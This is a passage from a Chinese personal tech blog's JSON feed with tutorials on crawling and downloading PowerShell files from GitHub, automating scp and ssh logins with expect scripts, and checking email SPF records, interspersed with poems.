class=\"keyword\">in</span> repos:</span><br><span class=\"line\">            cur_ps = get_ps_in_repo(repo)</span><br><span class=\"line\">            ps += cur_ps</span><br><span class=\"line\">                </span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;ps.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f:  <span class=\"comment\"># 这个过程比较漫长，加个存档</span></span><br><span class=\"line\">                f.write(<span class=\"built_in\">str</span>(ps))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(ps) &gt; ps_num:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ps</span><br><span class=\"line\">        page += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">ps = traverse_repos(<span class=\"number\">100</span>)</span><br></pre></td></tr></table></figure>\n<p>至此，我们就拿到了 100 个.ps1 文件的链接。这个访问的时间非常长，暂时不知道怎么优化，有解决方案的小伙伴可以留言交流一下。</p>\n<h1 id=\"多线程下载github文件\"><a class=\"markdownIt-Anchor\" href=\"#多线程下载github文件\">#</a> 多线程下载 Github 文件</h1>\n<h2 id=\"下载单个github文件\"><a class=\"markdownIt-Anchor\" href=\"#下载单个github文件\">#</a> 下载单个 github 文件</h2>\n<p>可以通过 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t\">https://raw.githubusercontent.com</span> 来下载单个 github 文件</p>\n<div style=\"width:100%;margin:auto\"><img data-src=\"/deobfuscator-crawler/raw-github.png\" class=\"\"></div>\n<p>上述文件的链接地址为 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01pY2tzSVRCbG9ncy9Qb3dlclNoZWxsL3Jhdy9tYXN0ZXIvMjAxM1Jldml0QnVpbGRpbmdQcmVtaXVtVW5pbnN0YWxsZXIucHMx\">https://github.com/MicksITBlogs/PowerShell/raw/master/2013RevitBuildingPremiumUninstaller.ps1</span></p>\n<p>使用  <code>wget</code>  测试能否正常下载</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget  https://github.com/dracula/powershell/raw/master/README.md</span><br></pre></td></tr></table></figure>\n<p>显示跳转到 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RyYWN1bGEvcG93ZXJzaGVsbC9tYXN0ZXIvUkVBRE1FLm1k\">https://raw.githubusercontent.com/dracula/powershell/master/README.md</span> 进行下载</p>\n<p>所以直接将下载前缀改为 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t\">https://raw.githubusercontent.com</span></p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">download</span>(<span class=\"params\">url</span>):</span></span><br><span class=\"line\">    raw_base_url = <span class=\"string\">&quot;https://raw.githubusercontent.com&quot;</span></span><br><span class=\"line\">    file_url = raw_base_url + url</span><br><span class=\"line\"></span><br><span class=\"line\">    file_name = file_url.split(<span class=\"string\">&quot;/&quot;</span>)[-<span class=\"number\">1</span>] </span><br><span class=\"line\">    parent_dir = <span class=\"string\">&quot;./&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(parent_dir + file_name):  <span class=\"comment\"># 重名的话就随机生成字符串</span></span><br><span class=\"line\">        file_name = randomstr(<span class=\"number\">4</span>) + <span class=\"string\">&quot;_&quot;</span> + file_name</span><br><span class=\"line\">    file_name = parent_dir + file_name</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        r = requests.get(file_url)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> f:  <span class=\"comment\"># r.content 为二进制信息</span></span><br><span class=\"line\">            f.write(r.content)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> requests.ConnectionError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">download(<span class=\"string\">&quot;/dracula/powershell/master/screenshot.png&quot;</span>) </span><br></pre></td></tr></table></figure>\n<h2 id=\"多线程下载\"><a class=\"markdownIt-Anchor\" href=\"#多线程下载\">#</a> 多线程下载</h2>\n<p>不复杂，直接上代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing <span class=\"keyword\">import</span> Pool  <span class=\"comment\"># 多线程</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">multi_process</span>(<span class=\"params\">ps_files</span>):</span></span><br><span class=\"line\">    process_pool = Pool(<span class=\"number\">4</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ps_files:  <span class=\"comment\"># 并发，异步非阻塞模式</span></span><br><span class=\"line\">        process_pool.apply_async(download, args=(i,))  </span><br><span class=\"line\">    process_pool.close()</span><br><span class=\"line\">    process_pool.join()  <span class=\"comment\"># 等待所有结果执行完毕</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>\n  <center>《或者所谓春天》（节选）\n</p>\n<p>\n  <center><i>余光中</i>\n</p><p>\n  <center>所谓童年</center>\n  <center>所谓抗战</center>\n  <center>所谓高二</center>\n  <center>所谓大三</center>\n  <center>所谓蜜月，并非不月蚀</center>\n  <center>所谓贫穷，并非不美丽</center>\n  <center>所谓妻，曾是新娘</center>\n  <center>所谓新娘，曾是女友</center>\n  <center>所谓女友，曾非常害羞</center>\n  <center>所谓不成名以及成名</center>\n  <center>所谓朽以及不朽</center>\n  <center>或者所谓春天</center>\n</p>\n</blockquote>\n",
            "tags": [
                "crawler"
            ]
        },
        {
            "id": "https://snowroll.github.io/shell-except/",
            "url": "https://snowroll.github.io/shell-except/",
            "title": "shell-except",
            "date_published": "2020-10-21T14:57:55.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>except 简介</li>\n<li>利用 except，向服务器传输文件 &amp; ssh 登录服务器</li>\n</ul>\n<a id=\"more\"></a>\n<h4 id=\"1-except简介\"><a class=\"markdownIt-Anchor\" href=\"#1-except简介\">#</a> 1. except 简介</h4>\n<ul>\n<li>\n<p>except 的安装</p>\n<p>Mac:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install expect</span><br></pre></td></tr></table></figure>\n<p>Linux:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install expect</span><br></pre></td></tr></table></figure>\n<p>压缩包安装</p>\n<p>参考博客： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC85NDJiODAxNzU3ZGU=\">https://www.jianshu.com/p/942b801757de</span></p>\n</li>\n<li>\n<p>简介</p>\n<p>shell 脚本功能非常强大，可以帮助我们自动完成很多繁琐的工作。但是对于登录服务器这种需要自动交互的过程，shell 就有些力不从心，except 可以完美解决这一需求。</p>\n<p>参考博客： Linux expect 用法 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMHhjYWZlZGFkZHkvcC83MTQ3MDUxLmh0bWw=\">https://www.cnblogs.com/0xcafedaddy/p/7147051.html</span></p>\n<p>expect 脚本使用 <span class=\"exturl\" data-url=\"aHR0cDovL2VpbnZlcm5lLmdpdGh1Yi5pby9wb3N0LzIwMTkvMDEvZXhwZWN0LWNvbW1hbmQuaHRtbCMlRTUlODUlQjMlRTklOTQlQUUlRTUlOTElQkQlRTQlQkIlQTQ=\">http://einverne.github.io/post/2019/01/expect-command.html# 关键命令</span></p>\n<p>expect - 自动交互脚本 <span class=\"exturl\" data-url=\"aHR0cDovL3hzdGFyY2QuZ2l0aHViLmlvL3dpa2kvc2hlbGwvZXhwZWN0Lmh0bWw=\">http://xstarcd.github.io/wiki/shell/expect.html</span></p>\n<ul>\n<li>\n<p>四个重要的命令</p>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>spawn</td>\n<td>启动新的进程，输出可以被 expect 所捕获</td>\n</tr>\n<tr>\n<td>expect</td>\n<td>从进程接收字符串，期望获得字符串</td>\n</tr>\n<tr>\n<td>send</td>\n<td>向进程发送字符串，模拟用户输入，注意添加 <code>\\r</code>  回车</td>\n</tr>\n<tr>\n<td>interact</td>\n<td>允许用户与进程交互</td>\n</tr>\n</tbody>\n</table>\n</li>\n<li>\n<p>简单示例  <code>demo.sh</code></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/except</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">set</span> timeout 10;  <span class=\"comment\"># 设置程序超时时间</span></span><br><span class=\"line\">spawn ssh root@10.10.10.11  <span class=\"comment\"># ssh连接服务器</span></span><br><span class=\"line\">expect <span class=\"string\">&quot;password&quot;</span>  <span class=\"comment\"># 判断进程输出中是否有&quot;password&quot;</span></span><br><span class=\"line\">send <span class=\"string\">&quot;your_password\\r&quot;</span>  <span class=\"comment\"># 将密码输入 \\r是回车 </span></span><br><span class=\"line\">interact  <span class=\"comment\"># 保持与服务器端的连接</span></span><br></pre></td></tr></table></figure>\n<p>运行方法:  <code>except demo.sh</code></p>\n<p>\\r \\n 的区别： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8yMzgwNGIwYjAzYzg=\">https://www.jianshu.com/p/23804b0b03c8</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2-向服务器传输文件ssh登录服务器自动化脚本\"><a class=\"markdownIt-Anchor\" href=\"#2-向服务器传输文件ssh登录服务器自动化脚本\">#</a> 2. 向服务器传输文件 &amp; ssh 登录服务器自动化脚本</h4>\n<ul>\n<li>\n<p>except 与 shell 脚本结合</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"meta\">#!/usr/bin/expect</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 自动上传文件到服务器</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">auto_scp</span></span>()&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\"># -c: 执行脚本前先执行的命令</span></span><br><span class=\"line\">    expect -c <span class=\"string\">&quot;set timeout -1; </span></span><br><span class=\"line\"><span class=\"string\">            spawn scp yourfile root@10.10.10.10:/target_dir/</span></span><br><span class=\"line\"><span class=\"string\">            expect &#123;</span></span><br><span class=\"line\"><span class=\"string\">                \\&quot;yes/no\\&quot; &#123; send \\&quot;yes\\n\\&quot;; exp_continue&#125;</span></span><br><span class=\"line\"><span class=\"string\">                \\&quot;password\\&quot; &#123; send \\&quot;yourpasswd\\n\\&quot; &#125;  # \\n 和 \\r 均可以</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            interact</span></span><br><span class=\"line\"><span class=\"string\">            &quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ssh登录服务器</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">auto_ssh_restart</span></span>() &#123;</span><br><span class=\"line\">    expect -c <span class=\"string\">&quot;set timeout -1;</span></span><br><span class=\"line\"><span class=\"string\">            spawn ssh root@10.10.10.10</span></span><br><span class=\"line\"><span class=\"string\">            expect \\&quot;password\\&quot; </span></span><br><span class=\"line\"><span class=\"string\">            send \\&quot;yourpassword\\r\\&quot;</span></span><br><span class=\"line\"><span class=\"string\">            expect \\&quot;]#\\&quot; &#123; send \\&quot;pwd\\n\\&quot; &#125; </span></span><br><span class=\"line\"><span class=\"string\">            interact&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">auto_scp</span><br><span class=\"line\">auto_ssh_restart</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<center>点绛唇·途中逢管倅\n<center> 憔悴天涯，故人相遇情如故。别离何遽，忍唱阳关句！</center>\n<center>我是行人，更送行人去。愁无据。寒蝉鸣处，回首斜阳暮。</center>\n",
            "tags": [
                "linux",
                "shell",
                "except"
            ]
        },
        {
            "id": "https://snowroll.github.io/security-mail/",
            "url": "https://snowroll.github.io/security-mail/",
            "title": "邮件安全之spf协议",
            "date_published": "2020-10-18T02:24:32.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>spf 协议简介</li>\n<li>nslookup 检索域名对应的 spf 记录</li>\n<li>python 快速检索 spf 记录</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"1-spf协议简介\"><a class=\"markdownIt-Anchor\" href=\"#1-spf协议简介\">#</a> 1. spf 协议简介</h3>\n<ul>\n<li>\n<p>SPF 全称 Sender Policy Framework，发件人策略机制</p>\n<p>是以<strong> IP 地址</strong>认证电子邮件发件人身份的技术，<strong>域名所有者</strong>通过在<strong> DNS</strong> 中发布<strong> SPF 记录</strong>来授权合法使用该域名发送邮件的 IP 地址</p>\n<p>例子如下：</p>\n<div style=\"width:50%;margin:auto\"><img data-src=\"/security-mail/mail-head.png\" class=\"\" title=\"邮件头数据\"></div>\n<p>从这个邮件头的数据中，我们可以看到 <code>From</code>  字段显示发件人是来自 163 的用户，但是在 <code>smtp协议</code> 中，这部分可以由用户自行修改。也就意味着，这个发件人地址完全可以是伪造的。</p>\n<p>邮件的发送过程可以由下图简略所示，图片来源：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemFjaGFyeWppYS5tZS9pbmRleC5waHAvYXJjaGl2ZXMvMTMv\">https://www.zacharyjia.me/index.php/archives/13/</span></p>\n<div style=\"width:50%;margin:auto\"><img data-src=\"/security-mail/smtp.png\" class=\"\" title=\"发件流程\"></div>\n<p><code>Received</code>  字段是由邮件服务器在邮件转发过程中自动添加在邮件头部的，我们可以从中提取出发件服务器的原始 ip <code>123.126.97.1</code> ，通过 163 的 spf 记录来验证这份邮件是否是伪造的。</p>\n<p>163 的 spf 记录如下：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">163.com\ttext = &quot;v=spf1 include:spf.163.com -all&quot;</span><br><span class=\"line\">spf.163.com\ttext = &quot;v=spf1 include:a.spf.163.com include:b.spf.163.com include:c.spf.163.com include:d.spf.163.com include:e.spf.163.com -all&quot;</span><br><span class=\"line\">a.spf.163.com\ttext = &quot;v=spf1 ip4:220.181.12.0/22 ip4:220.181.31.0/24 ip4:123.125.50.0/24 ip4:220.181.72.0/24 ip4:123.58.178.0/24 ip4:123.58.177.0/24 ip4:113.108.225.0/24 ip4:218.107.63.0/24 ip4:123.58.189.128/25 ip4:123.126.96.0/24 ip4:123.126.97.0/24 -all&quot;</span><br></pre></td></tr></table></figure>\n<p>通过上面的结果，我们可以看到  <code>ip4:123.126.97.0/24</code>  被授权使用 <code>163.com</code>  的域名，所以这封邮件是真实的。</p>\n</li>\n<li>\n<p>接下来，我们来简单学习一下 spf 的语法规则</p>\n<p>参考文档：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZXJ2aWNlLm1haWwucXEuY29tL2NnaS1iaW4vaGVscD9zdWJ0eXBlPTEmYW1wO25vPTEwMDE1MDUmYW1wO2lkPTE2\">https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;no=1001505&amp;id=16</span></p>\n<p>SPF 记录由 SPF 版本和指定 IP 组成</p>\n<p><code>record = version terms *SP</code></p>\n<p>version =  <code>&quot;v=spf1&quot;</code>  即指定 SPF 的版本为 spf1</p>\n<p>terms 由机制 mechanisms 和修改符 modifiers（可选）组成，mechanisms 用来描述哪些 IP 被允许使用该域名发送邮件</p>\n<p>Mechanisms 包含以下几种类型</p>\n<p>mechanism = （all / include / a / mx / ptr / ip4 /exists）</p>\n<p><strong>（一） 机制 mechanisms</strong></p>\n<p>每个 mechanism 有四种前缀（默认前缀为 &quot;+&quot;）</p>\n<p>“+”  Pass</p>\n<p>“-”  Fail</p>\n<p>“~”  SoftFail</p>\n<p>“?”  Neutral</p>\n<p>在一条 SPF 记录中，从左到右依次对每个 mechanism 进行验证。对一个 mechanism 进行检测，有三种结果可能发生：IP 匹配成功，IP 匹配失败或者返回异常。如果 IP 匹配成功，处理结果返回该 mechanism 的前缀；如果 IP 匹配失败，继续下一个 mechanism；如果返回异常，则 mechanism 结束并返回该异常值；如果没有 mechanism 或者 modifier 匹配，则结果返回 “Neutral”。</p>\n<p>如果不存在 SPF 记录，则返回 “None”；如果在 DNS 解析过程中出现临时性错误，则返回 “TempError”；如果存在某些语法错误或者评估错误（如该域指向不为人知的机制），则返回 “PermError”。</p>\n<p>SPF 记录验证可能返回的结果如下：</p>\n<table>\n<thead>\n<tr>\n<th>Result</th>\n<th>Explanation</th>\n<th>Intended action</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Pass</td>\n<td>SPF 记录验证该发信 IP 为合法的</td>\n<td>接收邮件</td>\n</tr>\n<tr>\n<td>Fail</td>\n<td>SPF 记录验证该发信 IP 是不合法的</td>\n<td>拒绝邮件</td>\n</tr>\n<tr>\n<td>SoftFail</td>\n<td>SPF 验证该发信 IP 不是合法的，但是不采取强制措施</td>\n<td>接收邮件但作标识</td>\n</tr>\n<tr>\n<td>Neutral</td>\n<td>SPF 记录没有明确说明发信 IP 是否合法的信息</td>\n<td>接收邮件</td>\n</tr>\n<tr>\n<td>None</td>\n<td>域名没有设置 SPF 记录或者 SPF 记录验证没有结果</td>\n<td>接收邮件</td>\n</tr>\n<tr>\n<td>PermError</td>\n<td>发生永久性错误（如：SPF 记录格式错误）</td>\n<td>没有规定</td>\n</tr>\n<tr>\n<td>TempError</td>\n<td>发生临时性错误</td>\n<td>接收或拒绝邮件</td>\n</tr>\n</tbody>\n</table>\n<p><strong>1.</strong>  “all” 机制</p>\n<p><strong>“all” 表示所有 IP 都匹配</strong>。通常放在 SPF 记录末尾，<strong>表示处理剩下的所有情况。</strong></p>\n<p>例如：</p>\n<p>“v=spf1 mx -all” 表示允许所有该域的 MX 邮件服务器发送邮件，禁止其他的。</p>\n<p>“v=spf1 -all” 表示该域不会发送任何邮件。</p>\n<p>“v=spf1 +all” 表示域名所有者认为 SPF 是没有用的或者并不关心（任何服务器都可使用该域名发送邮件）。</p>\n<p><strong>2.</strong>  “ipv4” 机制</p>\n<p>ip4:&lt;ip4-address&gt;</p>\n<p>ip4:&lt;ip4-network&gt;/&lt;prefix-length&gt;</p>\n<p>如果没有提供 prefix-length ，默认为 /32。</p>\n<p><strong>3.</strong>  “a” 机制</p>\n<p>格式为：</p>\n<p>a</p>\n<p>a/&lt;prefix-length&gt;</p>\n<p>a:&lt;domain&gt;</p>\n<p>a:&lt;domain&gt;/&lt;prefix-length&gt;</p>\n<p>所有 A 记录都会检测。如果客户端 IP 在这些记录中，则该机制结果匹配。</p>\n<p>若没有指定域，则使用当前域。</p>\n<p>A 记录必须与客户端 IP 地址完全匹配，除非提供前缀长度，在这种情况下，A 记录查询返回的 IP 地址将扩展到其相应的 CIDR 前缀，且客户端 IP 将在其子网中查询。</p>\n<p>例如：</p>\n<p>“v=spf1 a -all”</p>\n<p>表示当前域被使用。</p>\n<p>“v=spf1 a:example.com -all”</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1leGFtcGxlLWU3M2tseTA1YXAyeTZtcncwd2VwM2cuY29t\">等价于当前域为 example.com</span>。</p>\n<p>“v=spf1 a:mailers.example.com -all”</p>\n<p>表示指定 mailers.example.com 的主机 IP 可以外发邮件。</p>\n<p>“v=spf1 a/24 a:offsite.example.com/24 -all”</p>\n<p>如果 example.com 解析到 192.0.2.1，那么整个 C 类地址 192.0.2.0/24 将作为客户端 IP 地址外发邮件。同样，如果 offsite.example.com 返回多个 A 记录，每个 IP 地址将被扩展到 CIDR 子网。</p>\n<p><strong>4.</strong>  “include” 机制</p>\n<p>格式为：</p>\n<p>include:&lt;domain&gt;</p>\n<p>表示指定域查询匹配。若查询返回不匹配或者有错误，接着处理下一个机制。警告：如果指定域没有一个有效的 SPF 记录，结果将返回永久性错误。某些邮件接收者会根据 “PermError” 拒绝接收邮件。</p>\n<p>例如：在下面例子中，客户端 IP 为 1.2.3.4，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1leGFtcGxlLWU3M2t5NjFhcHBvdjN0LmNvbQ==\">当前域为 example.com</span>.</p>\n<p>“v=spf1 include:example.com -all”</p>\n<p>若 example.com 没有 SPF 记录，结果为 “PermError”。</p>\n<p>假设 example.com 的 SPF 记录为 “v=spf1 a -all”，查询 example.com 的 A 记录，</p>\n<p>若与 1.2.3.4 匹配，返回 “Pass”；</p>\n<p>若不匹配，处理包含域的 “-all”，include 整个匹配失败；</p>\n<p>从这个例子的外部指令集可见，最终的结果仍为失败。</p>\n<p>因为信任关系，“include” 机制可能会被认为有越权行为。需要确保 “include” 机制不会给跨用户伪造的信息 SPF 验证返回 “Pass”。除非对指定的其他域技术机制到位，从而反正跨用户伪造，“include” 机制应该提供 “Neutral” 处理结果而非 “Pass”。即在 “include:” 前添加 “?” 前缀。例如：</p>\n<p>“v=spf1 ?include:example.com -all”</p>\n<p>如此看来，“include” 机制不宜选择。</p>\n<p>更多详细内容可以参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZXJ2aWNlLm1haWwucXEuY29tL2NnaS1iaW4vaGVscD9zdWJ0eXBlPTEmYW1wO25vPTEwMDE1MDUmYW1wO2lkPTE2\">https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;no=1001505&amp;id=16</span></p>\n</li>\n<li>\n<p>根据上述语法，我们再分析 163 的 spf 记录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">163.com\ttext &#x3D; &quot;v&#x3D;spf1 include:spf.163.com -all&quot;</span><br><span class=\"line\">spf.163.com\ttext &#x3D; &quot;v&#x3D;spf1 include:a.spf.163.com include:b.spf.163.com include:c.spf.163.com include:d.spf.163.com include:e.spf.163.com -all&quot;</span><br><span class=\"line\">a.spf.163.com\ttext &#x3D; &quot;v&#x3D;spf1 ip4:220.181.12.0&#x2F;22 ip4:220.181.31.0&#x2F;24 ip4:123.125.50.0&#x2F;24 ip4:220.181.72.0&#x2F;24 ip4:123.58.178.0&#x2F;24 ip4:123.58.177.0&#x2F;24 ip4:113.108.225.0&#x2F;24 ip4:218.107.63.0&#x2F;24 ip4:123.58.189.128&#x2F;25 ip4:123.126.96.0&#x2F;24 ip4:123.126.97.0&#x2F;24 -all&quot;</span><br></pre></td></tr></table></figure>\n<p>第一条记录，说明 163.com 的 spf 记录可以通过 <code>spf.163.com</code>  进行查询， <code>-all</code>  表明除了这个记录包含的 ip 地址，都会匹配失败</p>\n<p>第二条记录，说明 <code>spf.163.com</code>  的 spf 记录包含在 <code>a.spf.163.com</code> 、 <code>b.spf.163.com</code> 、 <code>c.spf.163.com</code> 、 <code>d.spf.163.com</code> 、 <code>e.spf.163.com</code>  几个域名的记录之中</p>\n<p>第三条记录，说明了 <code>a.spf.163.com</code>  所包含的 ip 地址集合，其中 <code>123.126.97.1</code>  在 <code>ip4:123.126.97.0/24</code>  之中，所以发件人确实为 163 的用户。</p>\n</li>\n</ul>\n<h3 id=\"2-nslookup-检索域名的spf记录\"><a class=\"markdownIt-Anchor\" href=\"#2-nslookup-检索域名的spf记录\">#</a> 2. nslookup 检索域名的 spf 记录</h3>\n<ul>\n<li>\n<p>命令行</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nslookup</span><br><span class=\"line\"><span class=\"built_in\">set</span> <span class=\"built_in\">type</span>=TXT</span><br><span class=\"line\">163.com</span><br><span class=\"line\">spf.163.com</span><br><span class=\"line\">a.spf.163.com</span><br></pre></td></tr></table></figure>\n<p>实际运行结果如下：</p>\n<div style=\"width:50%;margin:auto\"><img data-src=\"/security-mail/nslookup.png\" class=\"\" title=\"nslookup运行结果\"></div>\n</li>\n</ul>\n<h3 id=\"3-python-快速查询spf记录\"><a class=\"markdownIt-Anchor\" href=\"#3-python-快速查询spf记录\">#</a> 3. python 快速查询 spf 记录</h3>\n<ul>\n<li>\n<p>第三方包 SPF2IP， netaddr</p>\n<p>下载</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install netaddr</span><br><span class=\"line\">pip install SPF2IP</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>样例程序</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> SPF2IP <span class=\"keyword\">import</span> SPF2IP</span><br><span class=\"line\">spf_record = SPF2IP(<span class=\"string\">&#x27;163.com&#x27;</span>).IPArray(<span class=\"string\">&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>结果：</p>\n<div style=\"width:50%;margin:auto\"><img data-src=\"/security-mail/spf2ip.png\" class=\"\" title=\"结果示例\"></div>\n<p>快速判断一个 ip 是否在一个子网中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> netaddr <span class=\"keyword\">import</span> IPNetwork, IPAddress</span><br><span class=\"line\"><span class=\"keyword\">if</span> IPAddress(<span class=\"string\">&#x27;123.126.97.1&#x27;</span>) <span class=\"keyword\">in</span> IPNetwork(<span class=\"string\">&#x27;123/126.97.0/24&#x27;</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;True&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>结果：</p>\n<div style=\"width:50%;margin:auto\"><img data-src=\"/security-mail/netaddr.png\" class=\"\"></div>\n</li>\n</ul>\n<center>萬葉集\n<center>鸣神の　少しとよみて　さし昙り 雨も降らんか　君を留めん</center>\n<center>鸣神の　少しとよみて　降らずとも　我は止まらん　妹し留めば</center>\n<center>万叶集</center>\n<center>隐约雷鸣 阴霾天空 但盼风雨来 能留你在此</center>\n<center>隐约雷鸣 阴霾天空 即使风无雨 我亦留此地</center>\n",
            "tags": [
                "mail"
            ]
        },
        {
            "id": "https://snowroll.github.io/iptables/",
            "url": "https://snowroll.github.io/iptables/",
            "title": "iptables 简介",
